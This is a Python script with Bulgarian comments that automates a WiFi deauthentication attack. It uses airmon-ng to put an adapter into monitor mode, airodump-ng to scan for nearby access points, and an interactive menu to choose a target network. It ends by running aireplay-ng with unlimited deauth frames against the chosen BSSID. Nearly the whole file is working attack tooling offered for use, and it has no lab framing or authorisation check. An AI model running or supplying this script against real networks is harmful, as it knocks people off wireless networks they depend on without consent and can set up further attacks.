#!/usr/bin/env python3
# Linux разбира,че трябва да се изпълни с един интерпретатор.

# позволява на python да стартира системни команди.
import subprocess
# модул за regular expression ( търсене на шаблон в текст; извличан на информация ).
import re
# позволява да се пишат и четат csv файлове.
import csv
# позволява работа със: файловата система; системни променливи; потребители; права.
import os
# позволява времеви операции.
import time
# модул за копиране и преместване на файлове.
import shutil
# позволява работа с час и дата.
from datetime import datetime

# празен лист, който ще съдържа информация за намерените WiFi мрежи.
active_wireless_networks = []


# essid - името на WiFi мрежата; lst - списъкът с вече намерените мрежи.
def check_for_essid(essid, lst):
    # ако мрежата не съществува -> може да се добави; при намиране на съвпадение True => False.
    check_status = True

    # проверява дали списъкът е празен.
    if len(lst) == 0:
        return check_status

    # тук се обхожда всяка записана мрежа и се задейства, само ако безжичната мрежа има достъп до списъка.
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False

    # връща функцията
    return check_status


# Базов интерфейсен хедър
print("\n****************************************************************")
print("\n* Copyright of Georgi Bogdanov, 2026                              *")



# проверява дали в environ variables съществува променливата 'SUDO_UID', ако не съществува програмата спира.
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()

# връща списъка с всички файлови папки в текущата директория.
for file_name in os.listdir():
    # проверява се дали името съдържа .csv
    if ".csv" in file_name:
        print(
            "There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        # намираме точната работеща directory.
        directory = os.getcwd()
        try:
            # създаваме нова directory наречена "/backup/".
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        # взема текущата дата и час.
        timestamp = datetime.now()
        # преместваме намерените .csv файлове в backup папката.
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

# тук се създава regular expression, койото ще търси имената на WiFi интерфейси.
wlan_pattern = re.compile("^wlan[0-9]+")

# изпълнява iwconfig и намира наличните карти.
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())

# проверява дали има включен WiFi адаптер.
if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()

# така потребителя вижда номер + интерфейс.
print("The following WiFi interfaces are available:")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

# Проверка за валиден избор на интерфейс.
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

# записване на избран интерфейс.
hacknic = check_wifi_result[int(wifi_interface_choice)]

print("WiFi adapter connected!\nNow let's kill conflicting processes:")

# това стартира инструмент от Aircrack-ng, намира и спира процеси.
kill_confilict_processes = subprocess.run(["sudo", "airmon-ng", "check", "kill"])

print("Putting Wifi adapter into monitored mode:")
# стартиране на monitor mode.
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

# Това е "двигателят", който създава CSV файла в реално време.
discover_access_points = subprocess.Popen(
    ["sudo", "airodump-ng", "-w", "file", "--write-interval", "1", "--output-format", "csv", hacknic + "mon"],
    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# безкраен цикъл.
try:
    while True:
        # изчистване на екрана, след това се показва новия обновен списък.
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            # дефиниране на колоните.
            fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher',
                          'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
            # Търсим CSV файл, генериран от airodump-ng.
            if ".csv" in file_name:
                with open(file_name) as csv_h:
                    # връщане в началото на файла.
                    csv_h.seek(0)
                    # всеки ред става dictonary.
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for row in csv_reader:
                        # пропускаме заглавния ред.
                        if row["BSSID"] == "BSSID":
                            pass
                        # спираме четенето при достигане на клиентските данни.
                        elif row["BSSID"] == "Station MAC":
                            break
                        # ако няма мрежи в списъка ни, ги добавя.
                        elif check_for_essid(row["ESSID"], active_wireless_networks):
                            active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        # показване на мрежите.
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        # скрипта изчаква 1 секунда после прочита CSV файла отново.
        time.sleep(1)

except KeyboardInterrupt:
    # Спираме сканирането при натискане на Ctrl+C.
    print("\nReady to make choice.")

# Проверка за валиден избор от списъка.
while True:
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")

# извличане на данните за избраната мрежа.
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()

# смяна на канал, за да съвпадне с мишената.
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])

# изпращане на атаката (използваме монитор интерфейса).
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

# Потребителят трябва да използва Ctrl+C, за да спре скрипта.
